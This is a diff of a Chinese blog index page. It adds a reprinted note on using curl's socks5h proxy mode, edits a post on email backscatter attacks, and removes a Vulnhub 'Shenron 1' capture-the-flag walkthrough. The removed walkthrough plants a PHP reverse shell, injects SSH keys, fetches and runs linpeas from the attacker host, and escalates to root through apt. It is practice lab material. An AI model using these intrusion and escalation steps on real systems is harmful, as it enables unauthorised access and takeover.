@@ -82,6 +82,74 @@
 
     
         <h2 class="title">
+            <a href="/2023/07/04/Curl-Socks5h-x/">
+                Curl-Socks5h-x
+            </a>
+        </h2>
+    
+    <time>
+        Jul 4, 2023
+    </time>
+    <section class="content">
+        <h1><span id="linux讓-curl-藉由-socks5-proxy-連線時不要反解-dns造成連線失敗">[Linux]讓 curl 藉由 socks5 proxy 連線時，不要反解 DNS，造成連線失敗</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://ephrain.net/linux-%e8%ae%93-curl-%e8%97%89%e7%94%b1-socks5-proxy-%e9%80%a3%e7%b7%9a%e6%99%82%ef%bc%8c%e4%b8%8d%e8%a6%81%e5%8f%8d%e8%a7%a3-dns%ef%bc%8c%e9%80%a0%e6%88%90%e9%80%a3%e7%b7%9a%e5%a4%b1%e6%95%97/">Ephrain</a> 并作补充</p>
+</blockquote>
+<h2><span id="proxy-server链接问题">Proxy Server链接问题</span></h2><blockquote>
+<p>公司的專案程式通常需要支援各種 proxy server，如 HTTP proxy, socks4 和 socks5 proxy。<br>今天遇到一個問題，我們的程式底層會使用 libcurl 做 HTTP 連線，但連到一台 socks5 proxy 時卻不能成功…</p>
+<p>試著用 curl 加上 -x 選項來指定 proxy server，再加 -v 選項看看詳細的錯誤訊息：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 connect to IPv6 2600:1417:1b:184::23ac (locally resolved)</span><br><span class="line">* Can<span class="string">&#x27;t complete SOCKS5 connection to 0.0.0.0:0. (1)</span></span><br><span class="line"><span class="string">* Closing connection 0</span></span><br><span class="line"><span class="string">curl: (7) Can&#x27;</span>t complete SOCKS5 connection to 0.0.0.0:0. (1)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到訊息裡有一行 locally resolved，這行代表的是 curl 自行去查詢了 DNS，將 testdomain.com 的 IP 找出來，但因為 curl 使用的是 Happy Eyeball 的演算法，同時會發出 Type A 和 AAAA 的 DNS request 封包，因此如果 AAAA 的 DNS 回應封包先回來的話，就會拿到 testdomain.com 的對應 IPv6 位址，反之如果是 A 的 DNS 回應封包先回來的話，拿到的則是 IPv4 位址。</p>
+</blockquote>
+<blockquote>
+<p>下面用 Wireshark 觀察一下 curl 產生出來的 DNS 封包，它送出了 A 和 AAAA 兩種 DNS 封包，以下例來說是 A (IPv4) 的回應先回來，但這個結果會依據網路狀況而有所不同，有時候是 AAAA (IPv6) 的回應先回來：<br><img src="/2023/07/04/Curl-Socks5h-x/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>curl 自行查詢 DNS 這件事情有什麼錯誤嗎？<br>以這個例子來說，curl 幫忙查出 testdomain.com 的 IPv6 位址 2600:1417:1b:184::23ac，然後連線到 socks5 proxy 172.22.1.1，叫它連線到這個 IPv6 位址去。<br>然而，這台 socks5 proxy 所在的網路只設定了 IPv4 位址，所以 proxy server 本身是無法藉由 IPv6 位址來連線的！<br>因此它自然無法連線到 curl 指定的 IPv6 位址，導致連線失敗…</p>
+</blockquote>
+<blockquote>
+<p>要解決這個問題，可以叫 curl 不要雞婆自己去查 DNS，而是讓 proxy server 自己來查 DNS，因為 proxy server 自己知道所處的網路環境，像是它不能連 IPv6 網路時，自然不會去問 Type AAAA (IPv6) 的 DNS 結果。</p>
+</blockquote>
+<blockquote>
+<p>我們將原本的 socks5:&#x2F;&#x2F;<proxy>:<port> 改成 socks5h:&#x2F;&#x2F;<proxy>:<port>，代表要讓 proxy 自己的查詢 DNS，可以看到 curl 直接連到了 proxy server，沒有先做 DNS 查詢，而最終 proxy 也成功完成了連線：</port></proxy></port></proxy></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">testuser@localhost ~ curl -v -x socks5h://172.22.1.1:8080 https://testdomain.com</span><br><span class="line"></span><br><span class="line">* Rebuilt URL to: https://testdomain.com/</span><br><span class="line">*   Trying 172.22.1.1...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* SOCKS5 communication to testdomain.com:443</span><br><span class="line">* SOCKS5 request granted.</span><br><span class="line">* Connected to 172.22.1.1 (172.22.1.1) port 8080 (<span class="comment">#0)</span></span><br><span class="line">...</span><br><span class="line">* Curl_http_done: called premature == 0</span><br><span class="line">* Connection <span class="comment">#0 to host testdomain.com left intact</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>不過這種雷，幾乎是每次整合一個用到 libcurl 的模組，就會再踩到一次啊…</p>
+</blockquote>
+<h2><span id="我遇到的场景">我遇到的场景</span></h2><blockquote>
+<p>首先，我没想到我会被台湾同胞的这篇技术博客教到很有趣的东西，其次，博主的语言和繁体配合起来更有趣了，也基于尊重保留了完整原文<br><img src="/2023/07/04/Curl-Socks5h-x/1.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>公司做安全监控平台收敛内网后，外部主机关联内网服务器的数据，需要监控进程 agent 以走代理的方式进来<br>自然代理服务器的公网地址和内网地址不在一个网段，然后为了安全性，代理服务器内网地址虽然和监控服务器同一网段，但由于安全组的隔离两者是不能直接访问的……(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>代中代(<em>´◐∀◐&#96;</em>)</p>
+</blockquote>
+<blockquote>
+<p>很自然的 curl 即使走代理都找不到身处内网的监控服务器域名<br>我只能在代理服务器 host 上配一下域名解析，然后翻了许久找到了 curl 的代理访问方式原理，就是这位博主的文章，让我明白了可以让 Proxy Server 去做 curl 的进一步内网解析<br>泪目，乙方厂商技术整半天都解决不了的问题，后来和我说我给的命令，其他客户也有这种问题的不能装的也能装了，让我找他们销售要钱草w(“▔□▔)</p>
+</blockquote>
+<blockquote>
+<p>希望两岸互相少点偏见吧</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Chaos/" rel="tag">Chaos</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Socks5/" rel="tag">Socks5</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/06/27/Towards-The-Sun/">
                 向阳行（Towards The Sun）
             </a>
@@ -374,8 +442,8 @@
 <h2><span id="杂记">杂记</span></h2><blockquote>
 <p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
 <p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#x62;&#111;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;">&#98;&#x6f;&#x62;&#111;&#64;&#97;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#111;&#x62;&#111;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#x6d;">&#98;&#111;&#x62;&#111;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#x41;&#x49;&#x4c;&#69;&#x52;&#45;&#68;&#65;&#69;&#77;&#x4f;&#x4e;&#x40;&#120;&#x78;&#120;&#46;&#99;&#111;&#x6d;">&#77;&#x41;&#x49;&#x4c;&#69;&#x52;&#45;&#68;&#65;&#69;&#77;&#x4f;&#x4e;&#x40;&#120;&#x78;&#120;&#46;&#99;&#111;&#x6d;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
+<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#x62;&#111;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;">&#98;&#x6f;&#x62;&#111;&#x40;&#97;&#x62;&#x63;&#46;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#x62;&#x6f;&#98;&#111;&#64;&#97;&#98;&#99;&#46;&#x63;&#111;&#x6d;">&#x62;&#x6f;&#98;&#111;&#64;&#97;&#98;&#99;&#46;&#x63;&#111;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
+<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#65;&#x49;&#x4c;&#x45;&#82;&#45;&#x44;&#65;&#69;&#77;&#79;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#99;&#x6f;&#109;">&#77;&#65;&#x49;&#x4c;&#x45;&#82;&#45;&#x44;&#65;&#69;&#77;&#79;&#78;&#64;&#120;&#x78;&#x78;&#x2e;&#99;&#x6f;&#109;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
 <p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
 <p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
 <p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
@@ -839,104 +907,6 @@
 <p><img src="/2022/08/24/Shenron-2/18.png" alt="image-"></p>
 <p>3.在&#x2F;root目录下，可以找到flag，即root.txt：</p>
 <p><img src="/2022/08/24/Shenron-2/19.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shenron/" rel="tag">Shenron</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shenron-1/">
-                Shenron 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shenron1">Shenron:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shenron1">名称：shenron:1</span></h4><h4><span id="发布日期20201215">发布日期：2020.12.15</span></h4><h4><span id="作者shubham-mandloi">作者：Shubham mandloi</span></h4><h4><span id="系列shenron">系列：shenron</span></h4><h4><span id="推特shubhammandloi">推特：@shubhammandloi</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shenron-1ova">文件名：shenron-1.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshenronshenron-1ova">下载地址：</span></h4><h4><span id="md5-3d9f0f620846bc15f4591e7ac56c04b2">MD5: 3D9F0F620846BC15F4591E7AC56C04B2</span></h4><h4><span id="sha1-4e1d33e2338ada4ca1c093cd67725850a033baad">SHA1: 4E1D33E2338ADA4CA1C093CD67725850A033BAAD</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shenron1和攻击机kali2021在VirtualBox下设置为桥接模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shenron-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放22，80端口，访问主页还是apache2的初始页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.113 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;joomla和&#x2F;test两个值得关注的目录，可以进行访问：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="寻找密码登录joomla后台">寻找密码，登录joomla后台</span></h3><blockquote>
-<p>1.访问192.168.56.113&#x2F;test，发现有password文件，查看password源码，能够发现admin用户的密码：</p>
-<p><img src="/2022/08/24/Shenron-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/8.png" alt="image-"></p>
-<p>2.可以用admin用户登录joomla管理后台：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.113/joomla -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，寻找后台</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/9.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/10.png" alt="image-"></p>
-</blockquote>
-<h3><span id="上传webshell">上传webshell</span></h3><blockquote>
-<p>1.修改kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，同时开启kali端口监听：</p>
-<p><img src="/2022/08/24/Shenron-1/11.png" alt="image-"></p>
-<p>2.在joomla后台管理页Templates-Templates-Protostar Details and Files-error.php内写入webshell内容后保存：</p>
-<p><img src="/2022/08/24/Shenron-1/12.png" alt="image-"></p>
-<p>3.访问不存在页面，触发webshell，再使用python构建交互式shell：</p>
-<p><img src="/2022/08/24/Shenron-1/13.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh免密登录逐步提权">SSH免密登录，逐步提权</span></h3><blockquote>
-<p>1.在&#x2F;var&#x2F;www&#x2F;html&#x2F;joomla目录下，我们从configuration.php文件中可以发现jenny用户及其密码，可用作登录：</p>
-<p><img src="/2022/08/24/Shenron-1/15.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shenron-1/16.png" alt="image-"></p>
-<p>2.登录jenny用户后，我们尝试使用ssh免密登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub，首先在kali上查看自己的ssh密钥并复制下来，没有的话执行ssh-keygen，回车默认</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cd .ssh</span><br><span class="line">echo __public key__ &gt;&gt; authorized_keys，在jenny用户进入/.ssh目录，写入kali复制的密钥</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/18.png" alt="image-"></p>
-<p>3.接着我们进行执行权限查看，发现shenron用户可以使用复制命令，则刚好可以把jenny现在有的ssh密钥复制过去，免密登录shenron：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /home/jenny/.ssh/authorized_keys /tmp/</span><br><span class="line">sudo -u shenron cp /tmp/authorized_keys /home/shenron/.ssh/</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在&#x2F;var&#x2F;opt目录下，我们能发现password.txt，应该是shenron用户的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python3 -m http.server 8001，在kali开放http服务</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:8001/linpeas.sh，使用linpeas.sh工具扫描</span><br><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh | tee output</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/21.png" alt="image-"></p>
-<p>2.在shenron用户基础上，再查看权限，发现所有用户都可以使用apt，则用apt进行提权（详见<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/apt-get/%EF%BC%89%EF%BC%9A">https://gtfobins.github.io/gtfobins/apt-get/）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt install -c $TF sl</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shenron-1/22.png" alt="image-"></p>
-<p>3.在root用户&#x2F;root目录下，可以查看flag，即root.txt：</p>
-<p><img src="/2022/08/24/Shenron-1/23.png" alt="image-"></p>
 </blockquote>
 
 
